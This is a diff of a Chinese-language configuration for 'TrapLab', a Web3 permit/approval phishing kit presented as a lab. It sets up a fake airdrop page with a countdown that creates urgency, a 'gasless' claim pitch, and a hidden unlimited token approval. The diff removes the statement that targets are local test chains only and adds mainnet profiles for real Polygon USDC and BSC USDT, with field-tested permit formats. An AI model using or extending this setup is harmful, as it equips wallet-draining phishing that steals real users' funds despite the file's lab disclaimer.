@@ -1,42 +1,26 @@
 # TrapLab 钓鱼实验室配置(案例二:Web3 授权钓鱼复现)
 #
-# ⚠ 安全边界:本配置及整套服务仅用于**自有内网实验室**的安全教育与攻防演练,
-#   目标链为本机/自有测试链(Anvil),私钥为公开测试私钥,零真实资产。
+# ⚠ 安全边界:本配置及整套服务仅用于**自有内网实验室**的安全教育与攻防演练。
+#   默认目标档案为 Anvil 本地测试链,零真实资产;切主网档案前先读 targets/ 内的实测注释。
 #   严禁将本服务暴露到公网或指向任何真实用户——那正是本案例要演示的犯罪行为。
 #   本文件含私钥,**已加入 .gitignore,绝不入库**。
 
-# 攻击者(收割方)身份:地址与私钥必须成对
+# 目标档案:链+代币+页面文案的打包实测产物,见 scripts/targets/*.yaml
+# 可选值看目录:anvil-default / polygon-usdc / bsc-usdt(或自建)
+target: anvil-default
+
+# 攻击者(收割方)身份:地址与私钥必须成对(敏感项,只放本文件,不入库)
 attacker:
   address: "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"   # Anvil 测试账户 #1
   key: "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
-
-# 目标链
-chain:
-  rpc: "http://127.0.0.1:8546"   # Anvil
-  chain_id: 31337
-  rpc_name: "NovaChain Mainnet"        # MetaMask 里显示的网络名(拟真,可任意)        # MetaMask 里显示的网络名
-
-# 假币(钓鱼站诱导授权的对象)
-token:
-  address: "0x8464135c8F25Da09e49BC8782676a84730C318bC"
-  name: "PhishingToken"          # ⚠ 必须与合约 permit 的 EIP-712 domain.name 一字不差
-  symbol: "AIRDROP"
-  permit_version: "1"            # permit EIP-712 domain.version;真实主网代币各异(如 Polygon USDC 为 "2"),用 DOMAIN_SEPARATOR 实测
-  permit_order: "deadline_first" # Permit 结构字段顺序:deadline_first=EIP-2612 标准 / nonce_first=Circle 系 USDC(实测 Polygon USDC 仅认后者)
-
-# 钓鱼页面包装(受害者看到的一切文案)
-site:
-  project: "星穹协议 NovaChain"
-  tagline: "下一代模块化 Layer2,主网空投第 3 期开启"
-  airdrop_amount: "1000"          # 页面展示的"可领取"数量
-  countdown_minutes: 47           # 倒计时(分钟),制造紧迫感
-  deadline: 1893456000            # permit deadline(Unix 秒)
-  gasless_text: "免 Gas 领取(由 NovaChain 赞助商代付)"
-  claim_mode: "unlimited"         # 主按钮的真实授权额度:unlimited=无限 / exact=恰为 airdrop_amount(对比演示用)
-  show_gasless: true              # 免 Gas(permit)按钮;目标代币 permit 不兼容时设 false(仅留 approve 主按钮)
-  style: "official"               # 页面皮肤:official=官方领取页 / meme=炒作风 / exchange=交易所活动风
 
 # 服务
 server:
   bind: "0.0.0.0:8088"            # 监听地址;仅限自有内网实验室
   admin_key: "traplab"            # /admin 访问口令
+
+# ── 高级:内联覆盖(与 target 互斥,二选一)────────────────────────
+# 不用档案时也可把 chain/token/site 直接写在本文件里(旧式写法,兼容保留):
+# chain:  { rpc: "...", chain_id: 31337, rpc_name: "..." }
+# token:  { address: "0x...", name: "...", symbol: "...", permit_version: "1", permit_order: "deadline_first" }
+# site:   { project: "...", tagline: "...", airdrop_amount: "1000", countdown_minutes: 47, deadline: 1893456000 }
